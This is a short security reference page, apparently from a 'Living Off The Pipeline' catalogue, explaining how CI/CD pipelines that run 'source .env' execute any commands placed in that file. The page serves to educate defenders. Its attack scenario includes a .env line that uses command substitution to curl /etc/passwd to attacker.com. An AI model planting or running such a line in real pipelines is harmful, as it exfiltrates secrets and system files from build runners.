---
layout: tool
title: source
tags: [shell, built-in, eval-sh]
references:
- https://www.gnu.org/software/bash/manual/html_node/Bash-Builtins.html#index-source
files: [any]
---

## Living Off The Pipeline - source (and .)

`source` (and its POSIX-compliant alias, `.`) is a shell built-in used to execute commands from a file within the current shell context. It is commonly used in CI/CD pipelines to load environment variables, making it a powerful "Living Off The Pipeline" (LOTP) vector.

### First-Order LOTP Tool

`source` is a **First-Order LOTP Tool**. It provides direct Remote Code Execution (RCE) by design, as its purpose is to execute the content of a file provided by the attacker.

#### Malicious Primitive: Remote Code Execution (RCE)

The attack vector is the file that is being sourced. A developer using `source .env` in a pipeline intends to load simple key-value pairs as environment variables. However, the shell will parse and execute *any* valid shell command within that file.

An attacker can embed malicious commands, often using command substitution (`$(...)` or `` `...` ``), inside a file that looks like a standard environment file. When the `source` command is executed, the shell executes the attacker's payload.

### Real-World Attack Scenario

1.  **Attacker's PR:** An attacker submits a pull request with a malicious `.env` file.
    ```bash
    # .env file
    # This looks like a variable assignment, but it contains a malicious payload.
    API_KEY=$(curl --data-binary @/etc/passwd http://attacker.com/)
    ```

2.  **Vulnerable Workflow:** The pipeline contains a completely standard and seemingly safe command to load variables.
    ```yaml
    - name: Load environment
      run: source .env
    ```

3.  **Execution:**
    *   The `source .env` command is executed.
    *   The shell reads the `.env` file to execute its content.
    *   To assign the value to `API_KEY`, the shell must first execute the command inside the `$(...)`.
    *   The attacker's `curl` command runs, exfiltrating data from the runner.

This attack is dangerous because it preys on the developer's assumption about the content of the file being sourced. The CI/CD command is benign, but the file it operates on is the weapon.